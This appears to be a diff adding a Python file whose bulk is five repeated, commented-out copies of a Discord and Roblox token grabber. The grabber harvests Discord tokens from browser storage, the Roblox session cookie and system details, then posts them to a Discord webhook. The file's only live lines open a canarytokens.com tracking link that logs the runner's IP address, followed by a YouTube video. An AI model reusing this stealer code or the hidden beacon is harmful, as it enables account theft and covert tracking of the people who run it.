@@ -1,0 +1,782 @@
+#██████╗░██╗███╗░░██╗██╗░░██╗██╗░░░██╗
+#██╔══██╗██║████╗░██║██║░██╔╝╚██╗░██╔╝
+#██████╔╝██║██╔██╗██║█████═╝░░╚████╔╝░
+#██╔═══╝░██║██║╚████║██╔═██╗░░░╚██╔╝░░
+#██║░░░░░██║██║░╚███║██║░╚██╗░░░██║░░░
+#╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝░░░╚═╝░░░
+
+
+
+
+#import requests
+#import os
+#import json
+#import re
+#import sys
+#import time
+#import socket, platform, psutil, wmi, ctypes
+#import subprocess
+#import colorama
+#import robloxpy
+#import browser_cookie3
+#import threading
+#import ssl
+#from datetime import date
+#import smtplib
+#from colorama import Fore, init
+#from tkinter import *
+#from tkinter.messagebox import *
+#from base64 import b64decode
+#from discord_webhook import DiscordWebhook
+#from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
+#from urllib.request import Request, urlopen
+
+#WEBHOOK_URL = ''
+
+#PING_ME = True #False-no True-yes
+
+#hwid = str(subprocess.check_output(
+   # 'wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+
+#os_info = wmi.WMI().Win32_OperatingSystem()[0]
+#proc_info = wmi.WMI().Win32_Processor()[0]
+#gpu_info = wmi.WMI().Win32_VideoController()[0]
+#system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
+#bits_str = str(ctypes.sizeof(ctypes.c_voidp))
+#bits_int = int(bits_str)
+#bits = bits_int * 8
+
+
+#webhook2 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Basic Grabber**\n')
+#response = webhook2.execute()
+#webhook4 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Hwid: ** {hwid}\n')
+#response = webhook4.execute()
+#webhook = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Ip address:** {ip} \n')
+#response = webhook.execute()
+#webhook3 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'''**Information Of PC** \n
+#Name: {socket.gethostname()}\n
+#FQDN: {socket.getfqdn()}\n
+#System Platform: {sys.platform}\n
+#Machine: {platform.machine()}\n
+#Node: {platform.node()}\n
+#Platform: {platform.platform()}\n
+#System OS: {platform.system()}\n
+#Version: {platform.version()}\n
+#Number of CPUs: {str(psutil.cpu_count())}\n
+#Number of Physical CPUs: {str(psutil.cpu_count(logical=False))}\n
+#Version: {platform.python_version()}\n
+#Compiler: {platform.python_compiler()}\n
+#Build version: {platform.python_build()[0]}\n
+#Build date: {platform.python_build()[1]}\n
+#CPU: {str(proc_info.Name)}\n
+#RAM: {str(system_ram)}\n
+#Graphics Card: {str(gpu_info.Name)}\n
+#Processor: {platform.processor()}
+#Memory Total {str(psutil.virtual_memory()[0])}\n
+#Memory Available: {str(psutil.virtual_memory()[1])}\n
+#Memory Used: {str(psutil.virtual_memory()[3])}\n
+#Memory Percent: {str(psutil.virtual_memory()[2])}\n
+#Memory Free: {str(psutil.virtual_memory()[4])}\n
+#''')
+#response = webhook3.execute()
+
+
+#def GrabCookie():
+    #robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
+    #try:
+        #count = 0
+     #while True:
+            #name, value, type = EnumValue(robloxstudiopath, count)
+            #if name == ".ROBLOSECURITY":
+                #return value
+            #count = count + 1
+    #except WindowsError:
+        #pass
+#try:
+    #roblox_cookie_value = str(GrabCookie())
+    #roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
+    #webhook5 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Roblox Cookie:** {roblox_cookie} \n')
+    #response = webhook5.execute()
+#except:pass
+
+#def find_tokens(path):
+    #path += '\\Local Storage\\leveldb'
+
+   #tokens = []
+
+    #for file_name in os.listdir(path):
+        #if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            #continue
+
+        #for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            #for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                #for token in re.findall(regex, line):
+                    #tokens.append(token)
+    #return tokens
+
+#def main():
+    #local = os.getenv('LOCALAPPDATA')
+    #roaming = os.getenv('APPDATA')
+
+    #paths = {
+        #'Discord': roaming + '\\Discord',
+        #'Discord Canary': roaming + '\\discordcanary',
+        #'Discord PTB': roaming + '\\discordptb',
+        #'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        #'Opera': roaming + '\\Opera Software\\Opera Stable',
+        #'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        #'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    #}
+
+    #message = '@everyone' if PING_ME else ''
+
+    #for platform, path in paths.items():
+        #if not os.path.exists(path):
+            #continue
+        #message = '**Discord Tokens**'
+        #message += f'\n**{platform}**\n```\n'
+
+        #tokens = find_tokens(path)
+
+        #if len(tokens) > 0:
+            #for token in tokens:
+                #message += f'{token}\n'
+        #else:
+            #message += 'No tokens found.\n'
+
+        #message += '```'
+
+    #headers = {
+        #'Content-Type': 'application/json',
+        #'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    #}
+
+    #payload = json.dumps({'content': message})
+
+    #try:
+        #req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        #urlopen(req)
+    #except:
+        #pass
+
+#if __name__ == '__main__':
+    #main()
+    #import requests
+#import os
+#import json
+#import re
+#import sys
+#import time
+#import socket, platform, psutil, wmi, ctypes
+#import subprocess
+#import colorama
+#import robloxpy
+#import browser_cookie3
+#import threading
+#import ssl
+#from datetime import date
+#import smtplib
+#from colorama import Fore, init
+#from tkinter import *
+#from tkinter.messagebox import *
+#from base64 import b64decode
+#from discord_webhook import DiscordWebhook
+#from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
+#from urllib.request import Request, urlopen
+
+#WEBHOOK_URL = ''
+
+#PING_ME = True #False-no True-yes
+
+#hwid = str(subprocess.check_output(
+   # 'wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+
+#os_info = wmi.WMI().Win32_OperatingSystem()[0]
+#proc_info = wmi.WMI().Win32_Processor()[0]
+#gpu_info = wmi.WMI().Win32_VideoController()[0]
+#system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
+#bits_str = str(ctypes.sizeof(ctypes.c_voidp))
+#bits_int = int(bits_str)
+#bits = bits_int * 8
+
+
+#webhook2 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Basic Grabber**\n')
+#response = webhook2.execute()
+#webhook4 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Hwid: ** {hwid}\n')
+#response = webhook4.execute()
+#webhook = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Ip address:** {ip} \n')
+#response = webhook.execute()
+#webhook3 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'''**Information Of PC** \n
+#Name: {socket.gethostname()}\n
+#FQDN: {socket.getfqdn()}\n
+#System Platform: {sys.platform}\n
+#Machine: {platform.machine()}\n
+#Node: {platform.node()}\n
+#Platform: {platform.platform()}\n
+#System OS: {platform.system()}\n
+#Version: {platform.version()}\n
+#Number of CPUs: {str(psutil.cpu_count())}\n
+#Number of Physical CPUs: {str(psutil.cpu_count(logical=False))}\n
+#Version: {platform.python_version()}\n
+#Compiler: {platform.python_compiler()}\n
+#Build version: {platform.python_build()[0]}\n
+#Build date: {platform.python_build()[1]}\n
+#CPU: {str(proc_info.Name)}\n
+#RAM: {str(system_ram)}\n
+#Graphics Card: {str(gpu_info.Name)}\n
+#Processor: {platform.processor()}
+#Memory Total {str(psutil.virtual_memory()[0])}\n
+#Memory Available: {str(psutil.virtual_memory()[1])}\n
+#Memory Used: {str(psutil.virtual_memory()[3])}\n
+#Memory Percent: {str(psutil.virtual_memory()[2])}\n
+#Memory Free: {str(psutil.virtual_memory()[4])}\n
+#''')
+#response = webhook3.execute()
+
+
+#def GrabCookie():
+    #robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
+    #try:
+        #count = 0
+     #while True:
+            #name, value, type = EnumValue(robloxstudiopath, count)
+            #if name == ".ROBLOSECURITY":
+                #return value
+            #count = count + 1
+    #except WindowsError:
+        #pass
+#try:
+    #roblox_cookie_value = str(GrabCookie())
+    #roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
+    #webhook5 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Roblox Cookie:** {roblox_cookie} \n')
+    #response = webhook5.execute()
+#except:pass
+
+#def find_tokens(path):
+    #path += '\\Local Storage\\leveldb'
+
+   #tokens = []
+
+    #for file_name in os.listdir(path):
+        #if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            #continue
+
+        #for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            #for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                #for token in re.findall(regex, line):
+                    #tokens.append(token)
+    #return tokens
+
+#def main():
+    #local = os.getenv('LOCALAPPDATA')
+    #roaming = os.getenv('APPDATA')
+
+    #paths = {
+        #'Discord': roaming + '\\Discord',
+        #'Discord Canary': roaming + '\\discordcanary',
+        #'Discord PTB': roaming + '\\discordptb',
+        #'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        #'Opera': roaming + '\\Opera Software\\Opera Stable',
+        #'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        #'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    #}
+
+    #message = '@everyone' if PING_ME else ''
+
+    #for platform, path in paths.items():
+        #if not os.path.exists(path):
+            #continue
+        #message = '**Discord Tokens**'
+        #message += f'\n**{platform}**\n```\n'
+
+        #tokens = find_tokens(path)
+
+        #if len(tokens) > 0:
+            #for token in tokens:
+                #message += f'{token}\n'
+        #else:
+            #message += 'No tokens found.\n'
+
+        #message += '```'
+
+    #headers = {
+        #'Content-Type': 'application/json',
+        #'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    #}
+
+    #payload = json.dumps({'content': message})
+
+    #try:
+        #req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        #urlopen(req)
+    #except:
+        #pass
+
+#if __name__ == '__main__':
+    #main()
+    #import requests
+#import os
+#import json
+#import re
+#import sys
+#import time
+#import socket, platform, psutil, wmi, ctypes
+#import subprocess
+#import colorama
+#import robloxpy
+#import browser_cookie3
+#import threading
+#import ssl
+#from datetime import date
+#import smtplib
+#from colorama import Fore, init
+#from tkinter import *
+#from tkinter.messagebox import *
+#from base64 import b64decode
+#from discord_webhook import DiscordWebhook
+#from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
+#from urllib.request import Request, urlopen
+
+#WEBHOOK_URL = ''
+
+#PING_ME = True #False-no True-yes
+
+#hwid = str(subprocess.check_output(
+   # 'wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+
+#os_info = wmi.WMI().Win32_OperatingSystem()[0]
+#proc_info = wmi.WMI().Win32_Processor()[0]
+#gpu_info = wmi.WMI().Win32_VideoController()[0]
+#system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
+#bits_str = str(ctypes.sizeof(ctypes.c_voidp))
+#bits_int = int(bits_str)
+#bits = bits_int * 8
+
+
+#webhook2 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Basic Grabber**\n')
+#response = webhook2.execute()
+#webhook4 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Hwid: ** {hwid}\n')
+#response = webhook4.execute()
+#webhook = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Ip address:** {ip} \n')
+#response = webhook.execute()
+#webhook3 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'''**Information Of PC** \n
+#Name: {socket.gethostname()}\n
+#FQDN: {socket.getfqdn()}\n
+#System Platform: {sys.platform}\n
+#Machine: {platform.machine()}\n
+#Node: {platform.node()}\n
+#Platform: {platform.platform()}\n
+#System OS: {platform.system()}\n
+#Version: {platform.version()}\n
+#Number of CPUs: {str(psutil.cpu_count())}\n
+#Number of Physical CPUs: {str(psutil.cpu_count(logical=False))}\n
+#Version: {platform.python_version()}\n
+#Compiler: {platform.python_compiler()}\n
+#Build version: {platform.python_build()[0]}\n
+#Build date: {platform.python_build()[1]}\n
+#CPU: {str(proc_info.Name)}\n
+#RAM: {str(system_ram)}\n
+#Graphics Card: {str(gpu_info.Name)}\n
+#Processor: {platform.processor()}
+#Memory Total {str(psutil.virtual_memory()[0])}\n
+#Memory Available: {str(psutil.virtual_memory()[1])}\n
+#Memory Used: {str(psutil.virtual_memory()[3])}\n
+#Memory Percent: {str(psutil.virtual_memory()[2])}\n
+#Memory Free: {str(psutil.virtual_memory()[4])}\n
+#''')
+#response = webhook3.execute()
+
+
+#def GrabCookie():
+    #robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
+    #try:
+        #count = 0
+     #while True:
+            #name, value, type = EnumValue(robloxstudiopath, count)
+            #if name == ".ROBLOSECURITY":
+                #return value
+            #count = count + 1
+    #except WindowsError:
+        #pass
+#try:
+    #roblox_cookie_value = str(GrabCookie())
+    #roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
+    #webhook5 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Roblox Cookie:** {roblox_cookie} \n')
+    #response = webhook5.execute()
+#except:pass
+
+#def find_tokens(path):
+    #path += '\\Local Storage\\leveldb'
+
+   #tokens = []
+
+    #for file_name in os.listdir(path):
+        #if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            #continue
+
+        #for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            #for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                #for token in re.findall(regex, line):
+                    #tokens.append(token)
+    #return tokens
+
+#def main():
+    #local = os.getenv('LOCALAPPDATA')
+    #roaming = os.getenv('APPDATA')
+
+    #paths = {
+        #'Discord': roaming + '\\Discord',
+        #'Discord Canary': roaming + '\\discordcanary',
+        #'Discord PTB': roaming + '\\discordptb',
+        #'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        #'Opera': roaming + '\\Opera Software\\Opera Stable',
+        #'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        #'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    #}
+
+    #message = '@everyone' if PING_ME else ''
+
+    #for platform, path in paths.items():
+        #if not os.path.exists(path):
+            #continue
+        #message = '**Discord Tokens**'
+        #message += f'\n**{platform}**\n```\n'
+
+        #tokens = find_tokens(path)
+
+        #if len(tokens) > 0:
+            #for token in tokens:
+                #message += f'{token}\n'
+        #else:
+            #message += 'No tokens found.\n'
+
+        #message += '```'
+
+    #headers = {
+        #'Content-Type': 'application/json',
+        #'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    #}
+
+    #payload = json.dumps({'content': message})
+
+    #try:
+        #req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        #urlopen(req)
+    #except:
+        #pass
+
+#if __name__ == '__main__':
+    #main()
+    #import requests
+#import os
+#import json
+#import re
+#import sys
+#import time
+#import socket, platform, psutil, wmi, ctypes
+#import subprocess
+#import colorama
+#import robloxpy
+#import browser_cookie3
+#import threading
+#import ssl
+#from datetime import date
+#import smtplib
+#from colorama import Fore, init
+#from tkinter import *
+#from tkinter.messagebox import *
+#from base64 import b64decode
+#from discord_webhook import DiscordWebhook
+#from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
+#from urllib.request import Request, urlopen
+
+#WEBHOOK_URL = ''
+
+#PING_ME = True #False-no True-yes
+
+#hwid = str(subprocess.check_output(
+   # 'wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+
+#os_info = wmi.WMI().Win32_OperatingSystem()[0]
+#proc_info = wmi.WMI().Win32_Processor()[0]
+#gpu_info = wmi.WMI().Win32_VideoController()[0]
+#system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
+#bits_str = str(ctypes.sizeof(ctypes.c_voidp))
+#bits_int = int(bits_str)
+#bits = bits_int * 8
+
+
+#webhook2 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Basic Grabber**\n')
+#response = webhook2.execute()
+#webhook4 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Hwid: ** {hwid}\n')
+#response = webhook4.execute()
+#webhook = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Ip address:** {ip} \n')
+#response = webhook.execute()
+#webhook3 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'''**Information Of PC** \n
+#Name: {socket.gethostname()}\n
+#FQDN: {socket.getfqdn()}\n
+#System Platform: {sys.platform}\n
+#Machine: {platform.machine()}\n
+#Node: {platform.node()}\n
+#Platform: {platform.platform()}\n
+#System OS: {platform.system()}\n
+#Version: {platform.version()}\n
+#Number of CPUs: {str(psutil.cpu_count())}\n
+#Number of Physical CPUs: {str(psutil.cpu_count(logical=False))}\n
+#Version: {platform.python_version()}\n
+#Compiler: {platform.python_compiler()}\n
+#Build version: {platform.python_build()[0]}\n
+#Build date: {platform.python_build()[1]}\n
+#CPU: {str(proc_info.Name)}\n
+#RAM: {str(system_ram)}\n
+#Graphics Card: {str(gpu_info.Name)}\n
+#Processor: {platform.processor()}
+#Memory Total {str(psutil.virtual_memory()[0])}\n
+#Memory Available: {str(psutil.virtual_memory()[1])}\n
+#Memory Used: {str(psutil.virtual_memory()[3])}\n
+#Memory Percent: {str(psutil.virtual_memory()[2])}\n
+#Memory Free: {str(psutil.virtual_memory()[4])}\n
+#''')
+#response = webhook3.execute()
+
+
+#def GrabCookie():
+    #robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
+    #try:
+        #count = 0
+     #while True:
+            #name, value, type = EnumValue(robloxstudiopath, count)
+            #if name == ".ROBLOSECURITY":
+                #return value
+            #count = count + 1
+    #except WindowsError:
+        #pass
+#try:
+    #roblox_cookie_value = str(GrabCookie())
+    #roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
+    #webhook5 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Roblox Cookie:** {roblox_cookie} \n')
+    #response = webhook5.execute()
+#except:pass
+
+#def find_tokens(path):
+    #path += '\\Local Storage\\leveldb'
+
+   #tokens = []
+
+    #for file_name in os.listdir(path):
+        #if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            #continue
+
+        #for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            #for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                #for token in re.findall(regex, line):
+                    #tokens.append(token)
+    #return tokens
+
+#def main():
+    #local = os.getenv('LOCALAPPDATA')
+    #roaming = os.getenv('APPDATA')
+
+    #paths = {
+        #'Discord': roaming + '\\Discord',
+        #'Discord Canary': roaming + '\\discordcanary',
+        #'Discord PTB': roaming + '\\discordptb',
+        #'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        #'Opera': roaming + '\\Opera Software\\Opera Stable',
+        #'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        #'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    #}
+
+    #message = '@everyone' if PING_ME else ''
+
+    #for platform, path in paths.items():
+        #if not os.path.exists(path):
+            #continue
+        #message = '**Discord Tokens**'
+        #message += f'\n**{platform}**\n```\n'
+
+        #tokens = find_tokens(path)
+
+        #if len(tokens) > 0:
+            #for token in tokens:
+                #message += f'{token}\n'
+        #else:
+            #message += 'No tokens found.\n'
+
+        #message += '```'
+
+    #headers = {
+        #'Content-Type': 'application/json',
+        #'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    #}
+
+    #payload = json.dumps({'content': message})
+
+    #try:
+        #req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        #urlopen(req)
+    #except:
+        #pass
+
+#if __name__ == '__main__':
+    #main()
+    #import requests
+#import os
+#import json
+#import re
+#import sys
+#import time
+#import socket, platform, psutil, wmi, ctypes
+#import subprocess
+#import colorama
+#import robloxpy
+#import browser_cookie3
+#import threading
+#import ssl
+#from datetime import date
+#import smtplib
+#from colorama import Fore, init
+#from tkinter import *
+#from tkinter.messagebox import *
+#from base64 import b64decode
+#from discord_webhook import DiscordWebhook
+#from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
+#from urllib.request import Request, urlopen
+
+#WEBHOOK_URL = ''
+
+#PING_ME = True #False-no True-yes
+
+#hwid = str(subprocess.check_output(
+   # 'wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+
+#os_info = wmi.WMI().Win32_OperatingSystem()[0]
+#proc_info = wmi.WMI().Win32_Processor()[0]
+#gpu_info = wmi.WMI().Win32_VideoController()[0]
+#system_ram = float(os_info.TotalVisibleMemorySize) / 1048576
+#bits_str = str(ctypes.sizeof(ctypes.c_voidp))
+#bits_int = int(bits_str)
+#bits = bits_int * 8
+
+
+#webhook2 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Basic Grabber**\n')
+#response = webhook2.execute()
+#webhook4 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Hwid: ** {hwid}\n')
+#response = webhook4.execute()
+#webhook = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Ip address:** {ip} \n')
+#response = webhook.execute()
+#webhook3 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'''**Information Of PC** \n
+#Name: {socket.gethostname()}\n
+#FQDN: {socket.getfqdn()}\n
+#System Platform: {sys.platform}\n
+#Machine: {platform.machine()}\n
+#Node: {platform.node()}\n
+#Platform: {platform.platform()}\n
+#System OS: {platform.system()}\n
+#Version: {platform.version()}\n
+#Number of CPUs: {str(psutil.cpu_count())}\n
+#Number of Physical CPUs: {str(psutil.cpu_count(logical=False))}\n
+#Version: {platform.python_version()}\n
+#Compiler: {platform.python_compiler()}\n
+#Build version: {platform.python_build()[0]}\n
+#Build date: {platform.python_build()[1]}\n
+#CPU: {str(proc_info.Name)}\n
+#RAM: {str(system_ram)}\n
+#Graphics Card: {str(gpu_info.Name)}\n
+#Processor: {platform.processor()}
+#Memory Total {str(psutil.virtual_memory()[0])}\n
+#Memory Available: {str(psutil.virtual_memory()[1])}\n
+#Memory Used: {str(psutil.virtual_memory()[3])}\n
+#Memory Percent: {str(psutil.virtual_memory()[2])}\n
+#Memory Free: {str(psutil.virtual_memory()[4])}\n
+#''')
+#response = webhook3.execute()
+
+
+#def GrabCookie():
+    #robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
+    #try:
+        #count = 0
+     #while True:
+            #name, value, type = EnumValue(robloxstudiopath, count)
+            #if name == ".ROBLOSECURITY":
+                #return value
+            #count = count + 1
+    #except WindowsError:
+        #pass
+#try:
+    #roblox_cookie_value = str(GrabCookie())
+    #roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
+    #webhook5 = DiscordWebhook(url=f'{WEBHOOK_URL}', content=f'**Roblox Cookie:** {roblox_cookie} \n')
+    #response = webhook5.execute()
+#except:pass
+
+#def find_tokens(path):
+    #path += '\\Local Storage\\leveldb'
+
+   #tokens = []
+
+    #for file_name in os.listdir(path):
+        #if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            #continue
+
+        #for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            #for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                #for token in re.findall(regex, line):
+                    #tokens.append(token)
+    #return tokens
+
+#def main():
+    #local = os.getenv('LOCALAPPDATA')
+    #roaming = os.getenv('APPDATA')
+
+    #paths = {
+        #'Discord': roaming + '\\Discord',
+        #'Discord Canary': roaming + '\\discordcanary',
+        #'Discord PTB': roaming + '\\discordptb',
+        #'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        #'Opera': roaming + '\\Opera Software\\Opera Stable',
+        #'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        #'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    #}
+
+    #message = '@everyone' if PING_ME else ''
+
+    #for platform, path in paths.items():
+        #if not os.path.exists(path):
+            #continue
+        #message = '**Discord Tokens**'
+        #message += f'\n**{platform}**\n```\n'
+
+        #tokens = find_tokens(path)
+
+        #if len(tokens) > 0:
+            #for token in tokens:
+                #message += f'{token}\n'
+        #else:
+            #message += 'No tokens found.\n'
+
+        #message += '```'
+
+    #headers = {
+        #'Content-Type': 'application/json',
+        #'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    #}
+
+    #payload = json.dumps({'content': message})
+
+    #try:
+        #req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        #urlopen(req)
+    #except:
+        #pass
+
+#if __name__ == '__main__':
+    #main()
+    
+    
+import webbrowser
+
+webbrowser .open_new("http://canarytokens.com/traffic/dyps76d1ivbsglhxp3yfxwinm/submit.aspx")
+
+webbrowser .open_new("https://www.youtube.com/watch?v=1si7xMJBygs")
